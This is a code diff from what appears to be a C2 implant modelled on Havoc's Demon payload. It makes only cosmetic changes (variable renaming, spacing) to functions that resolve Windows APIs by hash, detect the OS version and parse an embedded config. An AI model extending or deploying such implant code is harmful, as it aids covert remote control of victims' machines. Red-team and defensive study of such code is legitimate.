@@ -37,8 +37,8 @@ namespace Implant {
     BOOL ResolveApi() {
         // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
 
-        bool            success     = true;
-        OSVERSIONINFOW  OSVersionW  = { };
+        bool success = true;
+        OSVERSIONINFOW os_version = { };
 
         x_assertb(Ctx->modules.kernel32 = M_PTR(KERNEL32));
         x_assertb(Ctx->modules.kernbase = M_PTR(KERNELBASE));
@@ -46,32 +46,32 @@ namespace Implant {
         x_assertb(F_PTR_HASHES(Ctx->nt.RtlGetVersion, NTDLL, RTLGETVERSION));
 
         Ctx->session.version = WIN_VERSION_UNKNOWN;
-        OSVersionW.dwOSVersionInfoSize = sizeof(OSVersionW);
+        os_version.dwOSVersionInfoSize = sizeof(os_version);
 
-        x_ntassertb(Ctx->nt.RtlGetVersion(&OSVersionW));
+        x_ntassertb(Ctx->nt.RtlGetVersion(&os_version));
 
-        if (OSVersionW.dwMajorVersion >= 5) {
-            if (OSVersionW.dwMajorVersion == 5) {
-                if (OSVersionW.dwMinorVersion == 1) {
+        if (os_version.dwMajorVersion >= 5) {
+            if (os_version.dwMajorVersion == 5) {
+                if (os_version.dwMinorVersion == 1) {
                     Ctx->session.version = WIN_VERSION_XP;
                 }
             }
-            else if (OSVersionW.dwMajorVersion == 6) {
-                if (OSVersionW.dwMinorVersion == 0) {
+            else if (os_version.dwMajorVersion == 6) {
+                if (os_version.dwMinorVersion == 0) {
                     Ctx->session.version = WIN_VERSION_2008;
                 }
-                else if (OSVersionW.dwMinorVersion == 1) {
+                else if (os_version.dwMinorVersion == 1) {
                     Ctx->session.version = WIN_VERSION_2008_R2;
                 }
-                else if (OSVersionW.dwMinorVersion == 2) {
+                else if (os_version.dwMinorVersion == 2) {
                     Ctx->session.version = WIN_VERSION_2012;
                 }
-                else if (OSVersionW.dwMinorVersion == 3) {
+                else if (os_version.dwMinorVersion == 3) {
                     Ctx->session.version = WIN_VERSION_2012_R2;
                 }
             }
-            else if (OSVersionW.dwMajorVersion == 10) {
-                if (OSVersionW.dwMinorVersion == 0) {
+            else if (os_version.dwMajorVersion == 10) {
+                if (os_version.dwMinorVersion == 0) {
                     Ctx->session.version = WIN_VERSION_2016_X;
                 }
             }
@@ -136,7 +136,7 @@ namespace Implant {
 
     BOOL ReadConfig() {
 
-        bool    success = true;
+        bool success    = true;
         _parser parser  = { };
 
         Parser::CreateParser(&parser, __config, sizeof(__config));
